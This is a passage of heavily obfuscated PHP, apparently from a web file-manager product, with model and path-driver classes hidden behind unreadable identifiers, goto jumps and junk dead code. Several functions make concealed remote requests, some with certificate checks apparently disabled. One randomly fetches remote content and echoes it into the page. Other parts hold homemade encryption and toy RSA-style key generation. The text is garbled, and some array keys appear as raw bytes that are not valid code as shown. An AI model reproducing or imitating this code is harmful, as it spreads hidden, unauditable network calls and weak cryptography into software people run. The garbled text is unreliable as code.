(strlen($œç‹ØÕÜ) < $Ãº¹Ù›º[607]) { die; } $ˆÎ”Ëé = $this->gvnp92c8a5a6($ˆÎ”Ëé, $²ıÎ¤®è[256]); $×ó»’Ñİ = $Ãº¹Ù›º[675]; $ˆÎ”Ëé = $ˆÎ”Ëé . $£‹ò´¥ä; $Ùøß«ÓÉ = $Ãº¹Ù›º[676]; if (!$Ùøß«ÓÉ) { return; } if ($«º«…¾º && is_array($«º«…¾º)) { $ˆÎ”Ëé = $ˆÎ”Ëé . $²ıÎ¤®è[257] . http_build_query($«º«…¾º); } if ($«º«…¾º === -1) { return $ˆÎ”Ëé; } $¯ƒó§”Â = stream_context_create(array($²ıÎ¤®è[216] => array($²ıÎ¤®è[219] => $´üã¨âú, $²ıÎ¤®è[217] => $²ıÎ¤®è[258]), $²ıÎ¤®è[259] => array($²ıÎ¤®è[260] => !1, $²ıÎ¤®è[261] => !1))); $é²†šÛ° = $Ãº¹Ù›º[677]; if (strlen($é²†šÛ°) < $Ãº¹Ù›º[617]) { die; } $«º«…¾º = @file_get_contents($ˆÎ”Ëé, !1, $¯ƒó§”Â); return json_decode($«º«…¾º, !0); $¶›õ·íµ = $Ãº¹Ù›º[635]; if (!$¶›õ·íµ) { die; } $šàšÄÇ¹ = $Ãº¹Ù›º[678]; } private function jgpl087917ca() { $œ¿¾‘üƒ =& $_SERVER[­á Ş³Ö]; $øêëİ™ä =& $_SERVER[ÕãïÎÍÅ]; $ŒÅş‰ˆŸ = array($øêëİ™ä[262] => $øêëİ™ä[263], $øêëİ™ä[264] => $øêëİ™ä[265], $øêëİ™ä[266] => $øêëİ™ä[267], $øêëİ™ä[268] => $øêëİ™ä[269], $øêëİ™ä[270] => $øêëİ™ä[271], $øêëİ™ä[272] => $øêëİ™ä[211], $øêëİ™ä[273] => $øêëİ™ä[211], $øêëİ™ä[274] => $øêëİ™ä[263], $øêëİ™ä[275] => $øêëİ™ä[265], $øêëİ™ä[276] => $øêëİ™ä[267], $øêëİ™ä[277] => $øêëİ™ä[278], $øêëİ™ä[279] => $øêëİ™ä[269], $øêëİ™ä[280] => $øêëİ™ä[281], $øêëİ™ä[282] => $øêëİ™ä[271], $øêëİ™ä[283] => $øêëİ™ä[284], $øêëİ™ä[285] => $øêëİ™ä[286], $øêëİ™ä[287] => $øêëİ™ä[288]); $•öÄğŠ = $ŒÅş‰ˆŸ[$this->xrgp672fde7b]; $•öÄğŠ = intval($•öÄğŠ ? $•öÄğŠ : $øêëİ™ä[263]); $€ª¿Ÿ‚ = $œ¿¾‘üƒ[679]; if (!$€ª¿Ÿ‚) { die; } $ÛñÆ¼Àş = _get($this->idou357f796e, $øêëİ™ä[289]); $ÛñÆ¼Àş = $ÛñÆ¼Àş ? intval($ÛñÆ¼Àş) : 0; $â×—†ªæ = $œ¿¾‘üƒ[680]; while (strlen($â×—†ªæ) < $œ¿¾‘üƒ[624]) { if (!$â×—†ªæ) { break; } $â×—†ªæ++; } return $•öÄğŠ + $ÛñÆ¼Àş; $·ô¡ó¡‘ = $œ¿¾‘üƒ[681]; if (!$·ô¡ó¡‘) { die; } } public function krep143df4a9($ ò¯ğŠË) { $Ù¤ÃÆ²ˆ =& $_SERVER[­á Ş³Ö]; $îñèÊÆ³ =& $_SERVER[ÕãïÎÍÅ]; $ûŒê€¢ = $this->jgpl087917ca(); if ($ ò¯ğŠË[$îñèÊÆ³[290]] == $îñèÊÆ³[121]) { return; } if ($ûŒê€¢ >= intval($îñèÊÆ³[211])) { return; } $‹ŠÑ´Çç = Model($îñèÊÆ³[124])->count(); $ÓğÔ = $Ù¤ÃÆ²ˆ[682]; if ($‹ŠÑ´Çç <= $ûŒê€¢) { return; } $’«ºßÒ° = Model($îñèÊÆ³[124])->field($îñèÊÆ³[290])->limit($ûŒê€¢)->select(); $Æ½Àå“İ = $Ù¤ÃÆ²ˆ[683]; $’«ºßÒ° = array_to_keyvalue($’«ºßÒ°, $îñèÊÆ³[6], $îñèÊÆ³[290]); if (!in_array($ ò¯ğŠË[$îñèÊÆ³[290]], $’«ºßÒ°)) { show_json($îñèÊÆ³[291], !1, $îñèÊÆ³[207]); } } public function odwr8725e2fa() { $¹Ùç·Í =& $_SERVER[­á Ş³Ö]; $ô¸— ¢ =& $_SERVER[ÕãïÎÍÅ]; if (!_get($GLOBALS, $ô¸— ¢[115]) || mt_rand(1, 100) > 20) { return; } $Æ·ë£¹ = $ô¸— ¢[214]; $µï¨Á„ô = $¹Ùç·Í[684]; $Æ·ë£¹ = $this->gvnp92c8a5a6($Æ·ë£¹, $ô¸— ¢[215]); $Ùí¡½ß = stream_context_create(array($ô¸— ¢[216] => array($ô¸— ¢[217] => $ô¸— ¢[218], $ô¸— ¢[219] => 3))); $û×¦ïûğ = $¹Ùç·Í[685]; $ÁÔú–­Å = @file_get_contents($Æ·ë£¹, !1, $Ùí¡½ß); $Ÿºè¢› = $¹Ùç·Í[686]; if (!$Ÿºè¢›) { return; } echo $ô¸— ¢[292] . hash_encode($ÁÔú–­Å) . $ô¸— ¢[293]; } private function fqbrffbc0e2b($ÇÒ†—¢«, $ãÏ³„¬, $ìØ…Ö€ğ = 3) { $Û¥â»şÉ =& $_SERVER[­á Ş³Ö]; $ºÜ¿÷ Ş =& $_SERVER[ÕãïÎÍÅ]; usleep(1); $Â¦§Ÿ = $Û¥â»şÉ[687]; $ÇÒ†—¢« = trim($ÇÒ†—¢«); $°šØ«Å§ = mt_rand(0, 5) . $ºÜ¿÷ Ş[6]; $À§‚¦¹º = $Û¥â»şÉ[688]; $ó¸ô¢ñ = rand_string(15); $¦ôÔ•­ë = $ºÜ¿÷ Ş[294]; $–›ªıÈ– = $Û¥â»şÉ[689]; switch ($°šØ«Å§) { case $ºÜ¿÷ Ş[203]: $öÆÖ°¯º = $this->joig8aa7e5f1($ÇÒ†—¢«, strrev($ãÏ³„¬ . $ó¸ô¢ñ)); break; $òš–¼±ä = $Û¥â»şÉ[690]; while ($òš–¼±ä < $Û¥â»şÉ[624]) { if ($òš–¼±ä >= 0) { break; } $òš–¼±ä++; } case $ºÜ¿÷ Ş[121]: $öÆÖ°¯º = $this->joig8aa7e5f1($ÇÒ†—¢«, strrev($ó¸ô¢ñ . $ãÏ³„¬)); $£É ‘¨” = $Û¥â»şÉ[691]; if (strlen($£É ‘¨”) < $Û¥â»şÉ[628]) { return; } break; $Ëìï–ù­ = $Û¥â»şÉ[692]; case $ºÜ¿÷ Ş[295]: $öÆÖ°¯º = $this->joig8aa7e5f1($ÇÒ†—¢«, base64_encode($ó¸ô¢ñ . $ãÏ³„¬)); $ÚÉËÎÚî = $Û¥â»şÉ[681]; if (!$ÚÉËÎÚî) { die; } break; case $ºÜ¿÷ Ş[296]: $öÆÖ°¯º = $this->joig8aa7e5f1($ÇÒ†—¢«, md5($ó¸ô¢ñ . $ãÏ³„¬)); break; case $ºÜ¿÷ Ş[297]: $ÇÒ†—¢« = base64_encode($ÇÒ†—¢«); $ÉÃ·Üéû = rand(0, 64); $¯…åÅÈ = $Û¥â»şÉ[693]; if (strlen($¯…åÅÈ) < $Û¥â»şÉ[617]) { die; } $óÆ§‚Æà = $¦ôÔ•­ë[$ÉÃ·Üéû]; $éê ¡Ÿ› = $Û¥â»şÉ[694]; $é°²Ïƒû = md5($óÆ§‚Æà . md5($ãÏ³„¬ . $óÆ§‚Æà) . $ãÏ³„¬); $é°²Ïƒû = substr($é°²Ïƒû, $ÉÃ·Üéû % 8, $ÉÃ·Üéû % 8 + 7); $’€•§»€ = $ºÜ¿÷ Ş[6]; $ÛŞìÇÜ = 0; $Í±™Ó«’ = 0; $îÒûÃ¶ = 0; for ($ÛŞìÇÜ = 0; $ÛŞìÇÜ < strlen($ÇÒ†—¢«); $ÛŞìÇÜ++) { $îÒûÃ¶ = $îÒûÃ¶ == strlen($é°²Ïƒû) ? 0 : $îÒûÃ¶; $ùœ£äÀ³ = $Û¥â»şÉ[695]; if (strlen($ùœ£äÀ³) < $Û¥â»şÉ[614]) { return; } $Í±™Ó«’ = ($ÉÃ·Üéû + strpos($¦ôÔ•­ë, $ÇÒ†—¢«[$ÛŞìÇÜ]) + ord($é°²Ïƒû[$îÒûÃ¶++])) % 64; $’€•§»€ .= $¦ôÔ•­ë[$Í±™Ó«’]; $®ãò’­º = $Û¥â»şÉ[696]; } $öÆÖ°¯º = hash_encode($óÆ§‚Æà . $’€•§»€); break; $ŞÚÒ¸Ï˜ = $Û¥â»şÉ[697]; while ($ŞÚÒ¸Ï˜ < $Û¥â»şÉ[628]) { if ($ŞÚÒ¸Ï˜ >= 0) { break; } $ŞÚÒ¸Ï˜++; } default: $öÆÖ°¯º = $this->joig8aa7e5f1($ÇÒ†—¢«, $ãÏ³„¬ . $ó¸ô¢ñ); $ÆÁßÆ³ = $Û¥â»şÉ[698]; while ($ÆÁßÆ³ < $Û¥â»şÉ[628]) { if ($ÆÁßÆ³ >= 0) { break; } $ÆÁßÆ³++; } break; $–ğŠëØï = $Û¥â»şÉ[699]; while ($–ğŠëØï < $Û¥â»şÉ[617]) { if ($–ğŠëØï >= 0) { break; } $–ğŠëØï++; } } $öÆÖ°¯º = strrev($°šØ«Å§ . $ó¸ô¢ñ . $öÆÖ°¯º); if ($ìØ…Ö€ğ - 1 > 0) { $öÆÖ°¯º = $this->fqbrffbc0e2b($öÆÖ°¯º, $ãÏ³„¬, $ìØ…Ö€ğ - 1); } return $öÆÖ°¯º; } private function kqgw4ac493ae($íİİë×, $«çÏşŸ, $Á¨íµáÌ = 3) { $Ú€ÀÂ‹Ê =& $_SERVER[­á Ş³Ö]; $£³®Ö¨£ =& $_SERVER[ÕãïÎÍÅ]; if (!is_string($íİİë×) || strlen($íİİë×) < 10) { return !1; } $íİİë× = trim($íİİë×); $¾ıêúäì = $Ú€ÀÂ‹Ê[700]; if (!$¾ıêúäì) { die; } $íİİë× = strrev($íİİë×); $ˆïß®¿ = $íİİë×[0]; $×ï¸Ÿ¨ = $Ú€ÀÂ‹Ê[701]; if (strlen($×ï¸Ÿ¨) < $Ú€ÀÂ‹Ê[614]) { return; } $Ãï…¬²¶ = substr($íİİë×, 1, 15); $Õù¥×³£ = $Ú€ÀÂ‹Ê[702]; $íİİë× = substr($íİİë×, 16); $Ê´Ë¼Ùü = $£³®Ö¨£[294]; switch ($ˆïß®¿) { case $£³®Ö¨£[203]: $Æ˜³ã˜ = $this->gvnp92c8a5a6($íİİë×, strrev($«çÏşŸ . $Ãï…¬²¶)); $æÀ§¢óØ = $Ú€ÀÂ‹Ê[703]; break; case $£³®Ö¨£[121]: $Æ˜³ã˜ = $this->gvnp92c8a5a6($íİİë×, strrev($Ãï…¬²¶ . $«çÏşŸ)); break; $İ­½Ñ¹ = $Ú€ÀÂ‹Ê[704]; case $£³®Ö¨£[295]: $Æ˜³ã˜ = $this->gvnp92c8a5a6($íİİë×, base64_encode($Ãï…¬²¶ . $«çÏşŸ)); break; $Ú§ùŠœª = $Ú€ÀÂ‹Ê[705]; if (strlen($Ú§ùŠœª) < $Ú€ÀÂ‹Ê[624]) { return; } case $£³®Ö¨£[296]: $Æ˜³ã˜ = $this->gvnp92c8a5a6($íİİë×, md5($Ãï…¬²¶ . $«çÏşŸ)); break; $Ş¸–Øß¬ = $Ú€ÀÂ‹Ê[706]; case $£³®Ö¨£[297]: $íİİë× = hash_decode($íİİë×); $§á‰¥ = $Ú€ÀÂ‹Ê[707]; $­ß˜Í‚£ = $íİİë×[0]; $ÍÒ›·÷Ş = $Ú€ÀÂ‹Ê[708]; if (strlen($ÍÒ›·÷Ş) < $Ú€ÀÂ‹Ê[607]) { die; } $íİİë× = substr($íİİë×, 1); $ï™å·éš = strpos($Ê´Ë¼Ùü, $­ß˜Í‚£); $°‚£Óç“ = md5($­ß˜Í‚£ . md5($«çÏşŸ . $­ß˜Í‚£) . $«çÏşŸ); $°‚£Óç“ = substr($°‚£Óç“, $ï™å·éš % 8, $ï™å·éš % 8 + 7); $„ôšâÄ­ = $£³®Ö¨£[6]; $†Ô¿¢öˆ = 0; $¹›È¹š = 0; $„È¥ÜõË = $Ú€ÀÂ‹Ê[709]; if (!$„È¥ÜõË) { die; } $şøªÑØÉ = 0; for ($†Ô¿¢öˆ = 0; $†Ô¿¢öˆ < strlen($íİİë×); $†Ô¿¢öˆ++) { $şøªÑØÉ = $şøªÑØÉ == strlen($°‚£Óç“) ? 0 : $şøªÑØÉ; $Ï†şñòæ = $Ú€ÀÂ‹Ê[710]; if (!$Ï†şñòæ) { die; } $´ãªÕÕÁ = $şøªÑØÉ++; $©ù™¿Ü = $Ú€ÀÂ‹Ê[711]; if (!$©ù™¿Ü) { die; } $¹›È¹š = strpos($Ê´Ë¼Ùü, $íİİë×[$†Ô¿¢öˆ]) - $ï™å·éš - ord($°‚£Óç“[$´ãªÕÕÁ]); $şºí‚­¾ = $Ú€ÀÂ‹Ê[712]; if (strlen($şºí‚­¾) < $Ú€ÀÂ‹Ê[607]) { return; } while ($¹›È¹š < 0) { $¹›È¹š += 64; $¤€¯Ü¬¼ = $Ú€ÀÂ‹Ê[713]; if (!$¤€¯Ü¬¼) { return; } } $„ôšâÄ­ .= $Ê´Ë¼Ùü[$¹›È¹š]; } $Æ˜³ã˜ = base64_decode($„ôšâÄ­); $ĞÂ»ï¢³ = $Ú€ÀÂ‹Ê[714]; break; default: $Æ˜³ã˜ = $this->gvnp92c8a5a6($íİİë×, $«çÏşŸ . $Ãï…¬²¶); break; } if ($Á¨íµáÌ - 1 > 0) { $Æ˜³ã˜ = $this->kqgw4ac493ae($Æ˜³ã˜, $«çÏşŸ, $Á¨íµáÌ - 1); } return $Æ˜³ã˜; } public function vimdc84c1307($ËğŸ÷‰œ) { $ÒÕç¡ñ =& $_SERVER[­á Ş³Ö]; $Àû€Â¡Æ =& $_SERVER[ÕãïÎÍÅ]; $õÂ­ÙÙç = $this->jhyg75bf5186(); $ŸĞ¶®è = $ÒÕç¡ñ[715]; if (!$ŸĞ¶®è) { die; } $°ªÈò€» = $this->jhyg75bf5186(); $ªşùÏ¡ë = $ÒÕç¡ñ[716]; if (!$ªşùÏ¡ë) { die; } $â‹¶¢Ó× = ($õÂ­ÙÙç - 1) * ($°ªÈò€» - 1); $îÓÎìÜ = intval(($õÂ­ÙÙç + $°ªÈò€») / 2); while (1) { $ò¼êŞ³Û = $îÓÎìÜ; $°ÑĞ‘Å = $ÒÕç¡ñ[717]; if (strlen($°ÑĞ‘Å) < $ÒÕç¡ñ[624]) { die; } $í£‡«òÍ = $â‹¶¢Ó×; while ($í£‡«òÍ % $ò¼êŞ³Û != 0) { $ÀÇÙ»— = $í£‡«òÍ; $í£‡«òÍ = $ò¼êŞ³Û; $‚ ÜšíÆ = $ÒÕç¡ñ[718]; if (strlen($‚ ÜšíÆ) < $ÒÕç¡ñ[628]) { return; } $ò¼êŞ³Û = $ÀÇÙ»— % $ò¼êŞ³Û; $öæ£ê£ = $ÒÕç¡ñ[719]; if (strlen($öæ£ê£) < $ÒÕç¡ñ[607]) { die; } } if ($ò¼êŞ³Û == 1) { break; } else { $îÓÎìÜ++; } } $³Çí¾Ôé = 2; for ($Öèş«ê = 0; $Öèş«ê < $â‹¶¢Ó× * 10; $Öèş«ê++) { if (($â‹¶¢Ó× * $Öèş«ê + 1) % $îÓÎìÜ == 0) { $³Çí¾Ôé = intval(($â‹¶¢Ó× * $Öèş«ê + 1) / $îÓÎìÜ); break; } } $„‰İèÏÇ = $this->joig8aa7e5f1($õÂ­ÙÙç * $°ªÈò€» . $Àû€Â¡Æ[6], $Àû€Â¡Æ[135]); $éò–ø÷ = md5($Àû€Â¡Æ[298] . ($õÂ­ÙÙç + $°ªÈò€») . $Àû€Â¡Æ[299] . $îÓÎìÜ . $Àû€Â¡Æ[299] . $³Çí¾Ôé . $Àû€Â¡Æ[300]); $Œş•µë = $ÒÕç¡ñ[720]; if (!$Œş•µë) { return; } $İÏŸìá² = $this->joig8aa7e5f1($ËğŸ÷‰œ, $éò–ø÷) . $Àû€Â¡Æ[301] . $„‰İèÏÇ; return $İÏŸìá²; $Ôª’¬Ÿó = $ÒÕç¡ñ[721]; if (strlen($Ôª’¬Ÿó) < $ÒÕç¡ñ[614]) { die; } } public function vusa75077c36($·¦¬É»Û) { $Ú‹îŸ‡Ä =& $_SERVER[­á Ş³Ö]; $“‡ıÅ˜¾ =& $_SERVER[ÕãïÎÍÅ]; $ùÓ®İÎº = explode($“‡ıÅ˜¾[301], $·¦¬É»Û); $Ú‚éÉÖ = $Ú‹îŸ‡Ä[722]; while (strlen($Ú‚éÉÖ) < $Ú‹îŸ‡Ä[617]) { if (!$Ú‚éÉÖ) { break; } $Ú‚éÉÖ++; } if (count($ùÓ®İÎº) != 2) { return $“‡ıÅ˜¾[6]; } $¯ôµë°„ = $this->gvnp92c8a5a6($ùÓ®İÎº[1] . $“‡ıÅ˜¾[6], $“‡ıÅ˜¾[135]); if (!$¯ôµë°„) { return $“‡ıÅ˜¾[6]; } $¯ôµë°„ = intval($¯ôµë°„); $ôÁâëÕ© = $Ú‹îŸ‡Ä[723]; if (!$ôÁâëÕ©) { return; } $³Ÿ„èú = 0; $åÙğÚÇ = $Ú‹îŸ‡Ä[724]; if (!$åÙğÚÇ) { return; } $ÃƒĞ›îò = 0; for ($ÄŞØÇıÒ = 3; $ÄŞØÇıÒ < $¯ôµë°„; $ÄŞØÇıÒ += 2) { if ($¯ôµë°„ % $ÄŞØÇıÒ != 0) { continue; } $³Ÿ„èú = $ÄŞØÇıÒ; $ÃƒĞ›îò = intval($¯ôµë°„ / $ÄŞØÇıÒ); $æÂŠÁÄÃ = $Ú‹îŸ‡Ä[725]; if (strlen($æÂŠÁÄÃ) < $Ú‹îŸ‡Ä[617]) { return; } break; } $®„ì¤¹® = ($³Ÿ„èú - 1) * ($ÃƒĞ›îò - 1); $ÚèÁüÑä = intval(($³Ÿ„èú + $ÃƒĞ›îò) / 2); $ãÈğÂĞ = $Ú‹îŸ‡Ä[726]; while ($ãÈğÂĞ < $Ú‹îŸ‡Ä[624]) { if ($ãÈğÂĞ >= 0) { break; } $ãÈğÂĞ++; } while (1) { $Ğ´¡‚¥¦ = $ÚèÁüÑä; $ëÉËÖñå = $Ú‹îŸ‡Ä[727]; while (strlen($ëÉËÖñå) < $Ú‹îŸ‡Ä[607]) { if (!$ëÉËÖñå) { break; } $ëÉËÖñå++; } $ÓŞ¨€® = $®„ì¤¹®; while ($ÓŞ¨€® % $Ğ´¡‚¥¦ != 0) { $§£××ßé = $ÓŞ¨€®; $ÓŞ¨€® = $Ğ´¡‚¥¦; $ù¯ş‚ˆ» = $Ú‹îŸ‡Ä[728]; if (strlen($ù¯ş‚ˆ») < $Ú‹îŸ‡Ä[628]) { return; } $Ğ´¡‚¥¦ = $§£××ßé % $Ğ´¡‚¥¦; } if ($Ğ´¡‚¥¦ == 1) { break; } else { $ÚèÁüÑä++; } } $Ññ¸öŒ = 2; for ($ÄŞØÇıÒ = 0; $ÄŞØÇıÒ < $®„ì¤¹® * 10; $ÄŞØÇıÒ++) { if (($®„ì¤¹® * $ÄŞØÇıÒ + 1) % $ÚèÁüÑä == 0) { $Ññ¸öŒ = intval(($®„ì¤¹® * $ÄŞØÇıÒ + 1) / $ÚèÁüÑä); break; } } $ÅÚ³îø = md5($“‡ıÅ˜¾[298] . ($³Ÿ„èú + $ÃƒĞ›îò) . $“‡ıÅ˜¾[299] . $ÚèÁüÑä . $“‡ıÅ˜¾[299] . $Ññ¸öŒ . $“‡ıÅ˜¾[300]); $“¡„šŞÔ = $Ú‹îŸ‡Ä[729]; if (strlen($“¡„šŞÔ) < $Ú‹îŸ‡Ä[624]) { return; } $èñÍÅû = $this->gvnp92c8a5a6($ùÓ®İÎº[0], $ÅÚ³îø); return $èñÍÅû; $—¶ä™Ñµ = $Ú‹îŸ‡Ä[730]; if (!$—¶ä™Ñµ) { die; } } public function jhyg75bf5186() { $“º˜æÙ =& $_SERVER[­á Ş³Ö]; $İ‘á˜ÀŒ = mt_rand(pow(2, 14), pow(2, 16) - 1); $Ì ­§Ë§ = $“º˜æÙ[731]; $öÛ¨ÇÙ¡ = array(); $Ó¢©¾û = 1; while ($Ó¢©¾û <= (int) sqrt($İ‘á˜ÀŒ)) { $Í…ìïßÔ = $Ó¢©¾û; $šçã¢û = $“º˜æÙ[732]; if (strlen($šçã¢û) < $“º˜æÙ[624]) { return; } while (!0) { $Í…ìïßÔ++; if ($Í…ìïßÔ <= 2) { $Ó¢©¾û = $Í…ìïßÔ; break; } else { if ($Í…ìïßÔ < 2) { continue; } } $¹¨£áÚ¾ = !0; for ($·œÅñæ = 2; $·œÅñæ <= sqrt($Í…ìïßÔ); $·œÅñæ++) { if ($Í…ìïßÔ % $·œÅñæ == 0) { $¹¨£áÚ¾ = !1; } } if ($¹¨£áÚ¾) { $Ó¢©¾û = $Í…ìïßÔ; break; } } $öÛ¨ÇÙ¡[] = $Ó¢©¾û; $Œ¥øñ¶º = $“º˜æÙ[733]; if (strlen($Œ¥øñ¶º) < $“º˜æÙ[624]) { die; } } $Üéè“Æ³ = 2; for ($Í…ìïßÔ = $İ‘á˜ÀŒ; $Í…ìïßÔ > 1; $Í…ìïßÔ--) { $¹¨£áÚ¾ = !0; $†üõ½× = $“º˜æÙ[734]; if (!$†üõ½×) { die; } foreach ($öÛ¨ÇÙ¡ as $íëÜõ‚“) { if ($Í…ìïßÔ % $íëÜõ‚“ == 0) { $¹¨£áÚ¾ = !1; break; } } if ($¹¨£áÚ¾) { $Üéè“Æ³ = $Í…ìïßÔ; break; } } return $Üéè“Æ³; } public function pdgzc6fe193e($Î¬Â§Ï, $¼ËÇ’êç) { $ÜÄËşà =& $_SERVER[ÕãïÎÍÅ]; return call_user_func(array($ÜÄËşà[8], $ÜÄËşà[302]), $Î¬Â§Ï, $¼ËÇ’êç); } public function joig8aa7e5f1($î€Ô¤ë¤, $ÜµâäÙ») { $™‚É¤¡Ş =& $_SERVER[ÕãïÎÍÅ]; return call_user_func(array($™‚É¤¡Ş[303], $™‚É¤¡Ş[304]), $î€Ô¤ë¤, $ÜµâäÙ»); } public function gvnp92c8a5a6($Ôã¯—ğµ, $´Œ‰£åó) { $£üÄÅ˜ô =& $_SERVER[­á Ş³Ö]; $É¡úî°³ =& $_SERVER[ÕãïÎÍÅ]; return call_user_func(array($É¡úî°³[303], $É¡úî°³[305]), $Ôã¯—ğµ, $´Œ‰£åó); $ş€¤´›“ = $£üÄÅ˜ô[735]; if (strlen($ş€¤´›“) < $£üÄÅ˜ô[614]) { die; } } } goto F›ßåİ¬â¡; aÙôÌØîÄ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\x6e\x6f\164\x69\x63\x65\x4c\x69\163\x74"; public $field = array("\156\x61\155\x65", "\143\157\x6e\x74\x65\x6e\x74", "\x61\165\x74\x68", "\155\x6f\144\x65", "\164\151\x6d\145", "\164\x79\160\x65", "\154\x65\x76\x65\x6c", "\x65\156\x61\142\x6c\x65", "\163\x6f\162\164"); public function listData($ßòÎ¥Æ = false, $èÌ²¾·Å = "\163\x6f\x72\164", $áÀ†ƒ® = false) { return parent::listData($ßòÎ¥Æ, $èÌ²¾·Å, $áÀ†ƒ®); } public function add($³¸à°Œ) { $¤·ÑìĞÁ =& $_SERVER[­á Ş³Ö]; $É°½Ù­— = time(); if ($³¸à°Œ[$¤·ÑìĞÁ[16]] == $¤·ÑìĞÁ[2283]) { $É°½Ù­— = strtotime($³¸à°Œ[$¤·ÑìĞÁ[180]]); } $³¸à°Œ[$¤·ÑìĞÁ[180]] = $É°½Ù­—; return parent::insert($³¸à°Œ); } public function update($Õ¤•Ã¸, $ßÓö˜Ò) { $õ‹Øù…· =& $_SERVER[­á Ş³Ö]; $¸ßôÎı± = $this->listData($Õ¤•Ã¸); if (!$¸ßôÎı±) { return !1; } $‰¢Ñ¨™ = time(); if ($ßÓö˜Ò[$õ‹Øù…·[16]] == $õ‹Øù…·[2283]) { $‰¢Ñ¨™ = strtotime($ßÓö˜Ò[$õ‹Øù…·[180]]); } $ßÓö˜Ò[$õ‹Øù…·[180]] = $‰¢Ñ¨™; return parent::update($Õ¤•Ã¸, $ßÓö˜Ò); } public function remove($ŸµáÏöı) { $ÃˆüçĞÉ = $this->listData($ŸµáÏöı); if (!$ÃˆüçĞÉ || $ÃˆüçĞÉ[$_SERVER[­á Ş³Ö][1280]]) { return !1; } return parent::remove($ŸµáÏöı); } public function sort($›¦£ùşæ, $†×˜®›) { return parent::update($›¦£ùşæ, $†×˜®›); } public function enable($÷Ş¦¿Öè, $Ó¿ïüáÜ) { return parent::update($÷Ş¦¿Öè, array($_SERVER[­á Ş³Ö][2284] => $Ó¿ïüáÜ)); } private function initUserOption() { $Õûó’ê¸ =& $_SERVER[­á Ş³Ö]; $this->optionType = $Õûó’ê¸[2285]; $this->modelType = $Õûó’ê¸[2286]; $this->field = array($Õûó’ê¸[2287], $Õûó’ê¸[32], $Õûó’ê¸[180], $Õûó’ê¸[33], $Õûó’ê¸[2288], $Õûó’ê¸[746], $Õûó’ê¸[196]); } public function userNoticeGet($ëİ»¦åÖ = false) { $this->initUserOption(); return parent::listData($ëİ»¦åÖ, $_SERVER[­á Ş³Ö][399], !0); } public function userNoticeAdd($½ùŞ‚¤‘) { $Ï¾Ìù¾À =& $_SERVER[­á Ş³Ö]; $this->initUserOption(); $ï¾—ºŠÓ = $this->findByKey($Ï¾Ìù¾À[2287], $½ùŞ‚¤‘[$Ï¾Ìù¾À[399]]); if ($ï¾—ºŠÓ) { return !0; } $æÀäÕ¡ = array($Ï¾Ìù¾À[2287] => $½ùŞ‚¤‘[$Ï¾Ìù¾À[399]], $Ï¾Ìù¾À[32] => $½ùŞ‚¤‘[$Ï¾Ìù¾À[32]], $Ï¾Ìù¾À[180] => $½ùŞ‚¤‘[$Ï¾Ìù¾À[180]], $Ï¾Ìù¾À[33] => isset($½ùŞ‚¤‘[$Ï¾Ìù¾À[33]]) ? $½ùŞ‚¤‘[$Ï¾Ìù¾À[33]] : 1, $Ï¾Ìù¾À[2288] => isset($½ùŞ‚¤‘[$Ï¾Ìù¾À[2288]]) ? $½ùŞ‚¤‘[$Ï¾Ìù¾À[2288]] : 0, $Ï¾Ìù¾À[746] => 0, $Ï¾Ìù¾À[196] => 0); return parent::insert($æÀäÕ¡); } public function userNoticeEdit($õÏ—ÈÓ¥, $Ãª¯÷Îß) { $this->initUserOption(); return parent::update($õÏ—ÈÓ¥, $Ãª¯÷Îß); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\145\x6d\x5f\x6f\160\164\x69\x6f\x6e"; protected $jsonField = array("\x6d\x65\x6e\x75", "\x72\x6f\154\x65", "\162\157\154\x65\107\x72\x6f\x75\x70", "\162\145\147\x69\x73\x74", "\x65\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($ß¿ÆÎğ) { return "\x53\x79\163\x74\145\x6d\x4f\160\164\x69\157\156\x5f{$ß¿ÆÎğ}"; } protected function optionDefault($¼ëñ¿±³ = '') { $úÒ¬¸ÃÊ =& $_SERVER[­á Ş³Ö]; if ($¼ëñ¿±³ == $úÒ¬¸ÃÊ[12]) { return $GLOBALS[$úÒ¬¸ÃÊ[6]][$úÒ¬¸ÃÊ[381]]; } } } class SystemRecordModel extends ModelBaseLight { } goto AŒèåÑåõ÷; DÄ­¬´æ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ÒÊ¥—Ûª =& $_SERVER[­á Ş³Ö]; $this->objectDriver = array($ÒÊ¥—Ûª[60], $ÒÊ¥—Ûª[61], $ÒÊ¥—Ûª[62], $ÒÊ¥—Ûª[63], $ÒÊ¥—Ûª[64], $ÒÊ¥—Ûª[65], $ÒÊ¥—Ûª[66], $ÒÊ¥—Ûª[67], $ÒÊ¥—Ûª[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($‡Êøš§º) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($‡Êøš§º, $_SERVER[­á Ş³Ö][8]); } return $‡Êøš§º; } public function iconvApp($‘°¹¸¾) { return $‘°¹¸¾; } public function iconvSystem($´Àûöğ) { return $´Àûöğ; } public function iconvTo($ê²³€•¯, $âåí¼–¬, $¸ì‚üÑ¼) { $šãë“¿ú =& $_SERVER[­á Ş³Ö]; if (!$ê²³€•¯ || !function_exists($šãë“¿ú[69])) { return $ê²³€•¯; } static $¹¨¸Íãü = array(); $¢øüûà† = $âåí¼–¬ . $šãë“¿ú[70] . $¸ì‚üÑ¼ . $šãë“¿ú[71] . $ê²³€•¯; if (isset($¹¨¸Íãü[$¢øüûà†])) { return $¹¨¸Íãü[$¢øüûà†]; } if (function_exists($šãë“¿ú[72])) { $‘¶ÇØõ = @mb_convert_encoding($ê²³€•¯, $¸ì‚üÑ¼, $âåí¼–¬); } else { $‘¶ÇØõ = @iconv($âåí¼–¬, $¸ì‚üÑ¼, $ê²³€•¯); } $‘¶ÇØõ = $‘¶ÇØõ ? $‘¶ÇØõ : $ê²³€•¯; if (strstr($‘¶ÇØõ, $šãë“¿ú[73])) { $‘¶ÇØõ = str_replace($šãë“¿ú[73], $šãë“¿ú[11], $‘¶ÇØõ); } $¹¨¸Íãü[$âåí¼–¬ . $šãë“¿ú[70] . $¸ì‚üÑ¼ . $šãë“¿ú[71] . $ê²³€•¯] = $‘¶ÇØõ; $¹¨¸Íãü[$¸ì‚üÑ¼ . $šãë“¿ú[70] . $âåí¼–¬ . $šãë“¿ú[71] . $ê²³€•¯] = $ê²³€•¯; $¹¨¸Íãü[$¸ì‚üÑ¼ . 